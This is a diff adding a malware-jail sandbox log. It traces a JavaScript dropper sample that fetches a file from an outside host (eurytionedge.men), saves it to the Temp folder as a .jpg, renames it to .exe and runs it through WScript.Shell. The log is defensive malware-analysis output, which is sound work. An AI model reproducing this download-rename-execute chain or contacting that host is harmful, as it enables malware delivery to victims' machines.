@@ -1,0 +1,70 @@
+11 Sep 18:46:40 - mailware-jail, a malware sandbox ver. 0.15
+11 Sep 18:46:40 - ------------------------
+11 Sep 18:46:40 - Arguments: /home/maik/gitHub/TFM/fame/storage/29e9e7f0192187b17e8ee069747cd6aea9683045a9c251eb3e1d84cba2b30245/prueba-sinEval.js
+11 Sep 18:46:40 - Sandbox environment sequence: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js,fame/modules/community/processing/malware_jail/malware-jail/env/eval.js,fame/modules/community/processing/malware_jail/malware-jail/env/function.js,fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js,fame/modules/community/processing/malware_jail/malware-jail/env/browser.js,fame/modules/community/processing/malware_jail/malware-jail/env/agents.js,fame/modules/community/processing/malware_jail/malware-jail/env/other.js,fame/modules/community/processing/malware_jail/malware-jail/env/console.js
+11 Sep 18:46:40 - Malware files: /home/maik/gitHub/TFM/fame/storage/29e9e7f0192187b17e8ee069747cd6aea9683045a9c251eb3e1d84cba2b30245/prueba-sinEval.js
+11 Sep 18:46:40 - Execution timeout set to: 60 seconds
+11 Sep 18:46:40 - Output file for sandbox dump: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
+11 Sep 18:46:40 - Output directory for generated files: fame/modules/community/processing/malware_jail/malware-jail/output/
+11 Sep 18:46:40 - Download from remote server: No
+11 Sep 18:46:41 - ==> Preparing Sandbox environment.
+11 Sep 18:46:41 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js quitely
+11 Sep 18:46:41 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/eval.js quitely
+11 Sep 18:46:41 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/function.js quitely
+11 Sep 18:46:41 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js quitely
+11 Sep 18:46:41 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/browser.js quitely
+11 Sep 18:46:41 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/agents.js quitely
+11 Sep 18:46:41 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/other.js quitely
+11 Sep 18:46:41 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/console.js quitely
+11 Sep 18:46:41 - ==> Executing malware file(s). =========================================
+11 Sep 18:46:41 -  => Executing: /home/maik/gitHub/TFM/fame/storage/29e9e7f0192187b17e8ee069747cd6aea9683045a9c251eb3e1d84cba2b30245/prueba-sinEval.js verbosely, reporting silent catches
+11 Sep 18:46:41 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/_home_maik_gitHub_TFM_fame_storage_29e9e7f0192187b17e8ee069747cd6aea9683045a9c251eb3e1d84cba2b30245_prueba-sinEval.js
+11 Sep 18:46:41 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/tr__home_maik_gitHub_TFM_fame_storage_29e9e7f0192187b17e8ee069747cd6aea9683045a9c251eb3e1d84cba2b30245_prueba-sinEval.js
+11 Sep 18:46:41 - WScript.scriptfullname = (string) '/home/maik/gitHub/TFM/fame/storage/29e9e7f0192187b17e8ee069747cd6aea9683045a9c251eb3e1d84cba2b30245/prueba-sinEval.js'
+11 Sep 18:46:41 - WScript.arguments = (object) '/home/maik/gitHub/TFM/fame/storage/29e9e7f0192187b17e8ee069747cd6aea9683045a9c251eb3e1d84cba2b30245/prueba-sinEval.js,xyz'
+11 Sep 18:46:41 - ActiveXObject(MSXML2.XMLHTTP)
+11 Sep 18:46:41 - new MSXML2.XMLHTTP[14]
+11 Sep 18:46:41 - MSXML2.XMLHTTP[14].onreadystatechange = (undefined) 'undefined'
+11 Sep 18:46:41 - MSXML2.XMLHTTP[14].open(GET,http://eurytionedge.men/admin.php?f=1.doc,false)
+11 Sep 18:46:41 - MSXML2.XMLHTTP[14].method = (string) 'GET'
+11 Sep 18:46:41 - MSXML2.XMLHTTP[14].url = (string) 'http://eurytionedge.men/admin.php?f=1.doc'
+11 Sep 18:46:41 - MSXML2.XMLHTTP[14].async = (boolean) 'false'
+11 Sep 18:46:41 - MSXML2.XMLHTTP[14].send(undefined)
+11 Sep 18:46:41 - MSXML2.XMLHTTP[14] Not sending data, if you want to interact with remote server, set --down
+11 Sep 18:46:41 - MSXML2.XMLHTTP[14].responsebody = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+11 Sep 18:46:41 - MSXML2.XMLHTTP[14].status = (number) '200'
+11 Sep 18:46:41 - MSXML2.XMLHTTP[14].readystate = (number) '4'
+11 Sep 18:46:41 - MSXML2.XMLHTTP[14].onreadystatechange.get() => (undefined) 'undefined'
+11 Sep 18:46:41 - MSXML2.XMLHTTP[14].send(undefined) finished
+11 Sep 18:46:41 - MSXML2.XMLHTTP[14].status.get() => (number) '200'
+11 Sep 18:46:41 - MSXML2.XMLHTTP[14].responsebody.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+11 Sep 18:46:41 - ActiveXObject(Scripting.FileSystemObject)
+11 Sep 18:46:41 - new Scripting.FileSystemObject[15]
+11 Sep 18:46:41 - new DriveObject[16](C:)
+11 Sep 18:46:41 - DriveObject[16](C:).name = (string) 'C:'
+11 Sep 18:46:41 - new Collection[17]
+11 Sep 18:46:41 - Scripting.FileSystemObject[15].GetSpecialFolder(2) => C:\Users\User\AppData\Local\Temp\
+11 Sep 18:46:41 - ActiveXObject(ADODB.Stream)
+11 Sep 18:46:41 - new ADODB_Stream[18]
+11 Sep 18:46:41 - ADODB_Stream[18].Open()
+11 Sep 18:46:41 - ADODB_Stream[18].type = (number) '1'
+11 Sep 18:46:41 - ADODB_Stream[18].content = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+11 Sep 18:46:41 - ADODB_Stream[18].Write(str) - 11202 bytes
+11 Sep 18:46:41 - ADODB_Stream[18].size = (number) '11202'
+11 Sep 18:46:41 - ADODB_Stream[18].position = (number) '0'
+11 Sep 18:46:41 - ADODB_Stream[18].SaveToFile(C:\Users\User\AppData\Local\Temp\\4wq1b6kbv.jpg, 2)
+11 Sep 18:46:41 - ADODB_Stream[18].content.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+11 Sep 18:46:41 - ADODB_Stream[18].Close()
+11 Sep 18:46:41 - ActiveXObject(Scripting.FileSystemObject)
+11 Sep 18:46:41 - new Scripting.FileSystemObject[19]
+11 Sep 18:46:41 - new DriveObject[20](C:)
+11 Sep 18:46:41 - DriveObject[20](C:).name = (string) 'C:'
+11 Sep 18:46:41 - new Collection[21]
+11 Sep 18:46:41 - Scripting.FileSystemObject[19].movefile(C:\Users\User\AppData\Local\Temp\\4wq1b6kbv.jpg,C:\Users\User\AppData\Local\Temp\\4wq1b6kbv.exe)
+11 Sep 18:46:41 - ActiveXObject(WScript.Shell)
+11 Sep 18:46:41 - new WScript.Shell[22]
+11 Sep 18:46:41 - WScript.Shell[22].Run(C:\Users\User\AppData\Local\Temp\\4wq1b6kbv.exe, undefined, undefined)
+11 Sep 18:46:41 - ==> Cleaning up sandbox.
+11 Sep 18:46:41 - ==> Script execution finished, dumping sandbox environment to a file.
+11 Sep 18:46:41 - The sandbox context has been  saved to: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
+11 Sep 18:46:41 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/C__Users_User_AppData_Local_Temp__4wq1b6kbv.jpg
